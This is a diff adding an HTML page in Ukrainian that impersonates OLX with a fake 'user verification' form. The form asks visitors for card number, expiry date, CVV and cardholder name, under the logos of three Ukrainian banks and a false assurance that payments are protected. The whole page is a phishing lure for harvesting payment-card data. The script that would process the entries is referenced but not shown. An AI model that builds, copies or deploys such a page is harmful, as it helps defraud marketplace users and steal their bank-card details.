@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="uk">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="https://www.olx.uz/favicon.ico?v=8" />
+    <title>Верифікація користувача OLX</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz,wght@8..144,700&family=Roboto+Serif:opsz@8..144&family=Roboto:wght@400;700&display=swap"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+    />
+    <link rel="stylesheet" href="css/reset.css" />
+    <link rel="stylesheet" href="css/styles.css" />
+  </head>
+  <body>
+    <header class="header">
+      <div class="header_container">
+        <nav class="nav">
+          <div class="nav__logo">
+            <a href="#">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="72"
+                height="40"
+                viewBox="0 0 72 40"
+                fill="none"
+              >
+                <rect x="38" width="10" height="40" fill="#00E6DC"></rect>
+                <circle cx="17" cy="20" r="17" fill="#00E6DC"></circle>
+                <circle cx="17" cy="20" r="5" fill="#002B31"></circle>
+                <path
+                  d="M59 9H52V16L55 19L52 22.5V29H59L62 26L65 29H72V22L69 19L72 16V9H65L62 12L59 9Z"
+                  fill="#00E6DC"
+                ></path>
+              </svg>
+            </a>
+          </div>
+          <div class="burger-menu">
+            <div class="bar1"></div>
+            <div class="bar2"></div>
+            <div class="bar3"></div>
+          </div>
+          <div class="nav__menu">
+            <a href="#" class="menu__notifications">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="21"
+                height="21"
+                viewBox="0 0 21 21"
+                fill="none"
+              >
+                <path
+                  fill-rule="evenodd"
+                  clip-rule="evenodd"
+                  d="M11.1 2.809C7.626 2.809 4.8 5.6503 4.8 9.1432V16.7266L7.0977 15.5719L7.5 15.4765H12.9C16.374 15.4765 19.2 12.6352 19.2 9.1432C19.2 5.6512 16.374 2.809 12.9 2.809H11.1ZM4.3023 19L3 18.19V9.1441C3 4.6522 6.6333 1 11.1 1H12.9C17.3658 1 21 4.6531 21 9.1432C21 13.6333 17.3658 17.2855 12.9 17.2855H7.7124L4.3023 19Z"
+                  fill="white"
+                ></path>
+              </svg>
+              Повідомлення
+            </a>
+            <div class="menu__lang">
+              <a href="#" class="lang__ua"> Укр </a>
+              <a href="#" class="lang__ru"> Рус </a>
+            </div>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="22"
+              height="22"
+              viewBox="0 0 22 22"
+              fill="none"
+              class="menu__like"
+            >
+              <path
+                fill-rule="evenodd"
+                clip-rule="evenodd"
+                d="M18.5342 9.50312L11.0001 18.7175L3.48891 9.53337C3.00854 8.90064 2.74899 8.1278 2.75008 7.33337C2.75008 5.31121 4.3955 3.66671 6.41675 3.66671C7.22869 3.66835 8.01717 3.93917 8.65876 4.43678C9.30035 4.93439 9.75882 5.6307 9.96241 6.41671H12.0377C12.2412 5.63063 12.6996 4.93423 13.3413 4.43659C13.9829 3.93895 14.7714 3.66819 15.5834 3.66671C17.6056 3.66671 19.2501 5.31121 19.2501 7.33337C19.2501 8.12904 18.9943 8.88987 18.5342 9.50312ZM15.5834 1.83337C14.6756 1.83356 13.7819 2.0585 12.9821 2.48812C12.1824 2.91775 11.5014 3.5387 11.0001 4.29554C10.4987 3.5387 9.81777 2.91775 9.01802 2.48812C8.21827 2.0585 7.32459 1.83356 6.41675 1.83337C3.38441 1.83337 0.916748 4.30012 0.916748 7.33337C0.91657 8.53747 1.31352 9.70801 2.04608 10.6636L9.81758 20.1667H12.1844L19.977 10.6343C20.6969 9.68462 21.0856 8.52508 21.0834 7.33337C21.0834 4.30012 18.6157 1.83337 15.5834 1.83337Z"
+                fill="white"
+              ></path>
+            </svg>
+            <div class="menu__profile">
+              <button class="profile__btn">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    clip-rule="evenodd"
+                    d="M12 12C16.963 12 21 16.038 21 21L20 22H4L3 21C3 16.038 7.037 12 12 12ZM12 14C8.48 14 5.558 16.613 5.071 20H18.93C18.443 16.613 15.521 14 12 14ZM12 2C14.481 2 16.5 4.019 16.5 6.5C16.5 8.982 14.481 11 12 11C10.8069 10.9987 9.66311 10.5241 8.81948 9.68052C7.97585 8.83689 7.50132 7.69307 7.5 6.5C7.5 4.019 9.519 2 12 2ZM12 4C11.3372 4.00079 10.7018 4.26444 10.2331 4.73311C9.76444 5.20178 9.50079 5.8372 9.5 6.5C9.5 7.878 10.621 9 12 9C13.379 9 14.5 7.878 14.5 6.5C14.5 5.122 13.379 4 12 4Z"
+                    fill="white"
+                  ></path>
+                </svg>
+                <a href="#"> Ваш профіль </a>
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="18"
+                  height="18"
+                  viewBox="0 0 18 18"
+                  fill="none"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    clip-rule="evenodd"
+                    d="M1.50073 4.875H2.56123L3.51373 5.82825L9.00073 11.3145L14.487 5.82825L15.4402 4.875H16.5007V5.9355L15.5482 6.888L10.0612 12.375L9.31123 13.125H8.69098L5.73448 10.1685L2.45398 6.888L1.50148 5.9355L1.50073 4.875Z"
+                    fill="white"
+                  ></path>
+                </svg>
+              </button>
+            </div>
+            <button class="menu__add">Додати оголошення</button>
+          </div>
+        </nav>
+      </div>
+    </header>
+    <main>
+      <div class="container">
+        <div class="verification-wrapper">
+          <h1>Верифікація користувача OLX</h1>
+          <div class="verification-form">
+            <h2>Підтвердження даних</h2>
+            <p>Введіть дані вашої картки для оновлення персональних даних:</p>
+            <div class="card-details">
+              <form action="#">
+                <div class="form-group">
+                  <input
+                    type="text"
+                    id="card-number"
+                    name="card-number"
+                    placeholder=" "
+                    required
+                  />
+                  <label for="card-number">Номер картки</label>
+                </div>
+                <div class="form-group">
+                  <input
+                    type="text"
+                    id="expiry-date"
+                    name="expiry-date"
+                    placeholder=" "
+                    required
+                  />
+                  <label for="expiry-date">Термін дії</label>
+                </div>
+                <div class="form-group">
+                  <input
+                    type="text"
+                    id="cvv"
+                    name="cvv"
+                    placeholder=" "
+                    required
+                  />
+                  <label for="cvv">CVV</label>
+                </div>
+                <div class="form-group">
+                  <input
+                    type="text"
+                    id="name"
+                    name="name"
+                    placeholder=" "
+                    required
+                  />
+                  <label for="name">Ім'я на картці</label>
+                </div>
+                <button class="button" type="submit">Верифікувати</button>
+              </form>
+            </div>
+          </div>
+          <div class="secure-info">
+            <p>Ваші платежі захищені та зашифровані для вашої безпеки.</p>
+          </div>
+          <div class="bank-logos">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Logo_big2.png"
+              alt="ПриватБанк"
+              class="bank-logo"
+            />
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/3/31/Oschad_Bank.svg"
+              alt="ОщадБанк"
+              class="bank-logo"
+            />
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/d/db/Monobank_logo.svg"
+              alt="Монобанк"
+              class="bank-logo"
+            />
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer class="footer">
+      <div class="footer_container">
+        <div class="css-140f2xj">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="1em"
+            height="1em"
+            data-aut-id="icon"
+            viewBox="0 0 1024 1024"
+            class="css-sxvywv"
+          >
+            <path
+              fill="currentColor"
+              fill-rule="evenodd"
+              d="M672.073 786.477H533.036V200.534h139.037v585.943zM483.019 493.596c0 133.44-108.16 241.419-241.419 241.419S0 626.855 0 493.596c0-133.259 108.16-241.419 241.419-241.419s241.6 107.98 241.6 241.419zm-168.289 0c0-40.447-32.683-73.13-73.13-73.13s-73.13 32.683-73.13 73.13c0 40.447 32.683 73.13 73.13 73.13s73.13-32.683 73.13-73.13zm708.909-146.802h-92.27l-54.17 54.17-54.17-54.17h-92.27v93.895l53.448 53.448-53.448 53.448v92.631h93.715l52.906-52.906 52.906 52.906h93.715v-92.631l-53.448-53.448 53.448-53.448v-93.895h-.361z"
+            ></path>
+          </svg>
+          <span class="css-1x1cb38">
+            <span>
+              Усі онлайн-оголошення України на OLX - тут ви знайдете те, що
+              шукали! Натиснувши на кнопку Подати оголошення, ви зможете
+              розмістити оголошення на будь-яку тематику легко й швидко.<br />
+              За допомогою сервісу OLX ви зможете купити чи продати з рук у руки
+              практично все, що завгодно.</span
+            >
+          </span>
+          <div class="css-1gjms9p">
+            <span class="css-7u31r3">Спільноти OLX в соціальних мережах:</span>
+            <div class="css-z3nmlb">
+              <a
+                target="_blank"
+                rel="noopener noreferrer"
+                href="https://www.facebook.com/olx.ua"
+                data-testid="facebook"
+                ><svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="currentColor"
+                  viewBox="0 0 24 24"
+                  width="1em"
+                  height="1em"
+                  class="css-tjhtp3"
+                >
+                  <path
+                    d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.69 3.229 8.625 7.584 9.706v-6.65H7.522V12h2.062v-1.317c0-3.403 1.54-4.981 4.882-4.981.634 0 1.727.124 2.174.248v2.77a12.853 12.853 0 0 0-1.155-.037c-1.64 0-2.273.621-2.273 2.236V12h3.266l-.56 3.056h-2.706v6.87A9.997 9.997 0 0 0 22 12Z"
+                  ></path></svg></a
+              ><a
+                target="_blank"
+                rel="noopener noreferrer"
+                href="https://www.youtube.com/user/olxua"
+                data-testid="youtube"
+                ><svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="currentColor"
+                  viewBox="0 0 24 24"
+                  width="1em"
+                  height="1em"
+                  class="css-tjhtp3"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M9.954 14.954v-5.91L15.182 12l-5.228 2.955Zm11.628-7.769a2.508 2.508 0 0 0-1.769-1.768C18.255 5 12 5 12 5s-6.254 0-7.813.417c-.86.23-1.538.909-1.77 1.768C2 8.745 2 12 2 12s0 3.255.417 4.816c.23.86.909 1.537 1.769 1.768 1.56.417 7.813.417 7.813.417s6.256 0 7.814-.417a2.51 2.51 0 0 0 1.77-1.768C22 15.256 22 12 22 12s0-3.254-.418-4.814Z"
+                    clip-rule="evenodd"
+                  ></path></svg></a
+              ><a
+                target="_blank"
+                rel="noopener noreferrer"
+                href="https://twitter.com/olx_ua"
+                data-testid="twitter"
+                ><svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="1em"
+                  height="1em"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  class="css-tjhtp3"
+                >
+                  <path
+                    fill="currentColor"
+                    fill-rule="evenodd"
+                    d="M15.954 3.873c1.164 0 2.215.473 2.965 1.232 1.007-.159 2.292-.684 2.579-.889-.342.868-.852 1.552-1.731 2.147l.015.036c.95-.14 2.218-.581 2.218-.581-.59.786-1.234 1.503-1.921 2.006.001.03.005.059.005.089 0 .056-.006.111-.01.168.005.11.01.221.01.334 0 6.328-5.246 11.458-11.715 11.458A11.84 11.84 0 0 1 2 18.029c.315.021.63.034.947.034 1.562 0 3.174-.318 5.103-1.687-3.087 0-3.894-2.78-3.894-2.78.22.051.444.07.661.07.646 0 1.198-.173 1.198-.173-1.648-.24-3.332-2.197-3.332-4.084.91.522 1.708.55 1.865.55h.03C3.174 8.963 2.086 6.905 3.314 4.57c2.922 3.106 5.613 4.1 8.596 4.16a3.93 3.93 0 0 1-.086-.818c0-2.232 1.849-4.04 4.13-4.04Z"
+                    clip-rule="evenodd"
+                  ></path>
+                </svg>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+    <script src="js/index.js"></script>
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+  </body>
+</html>
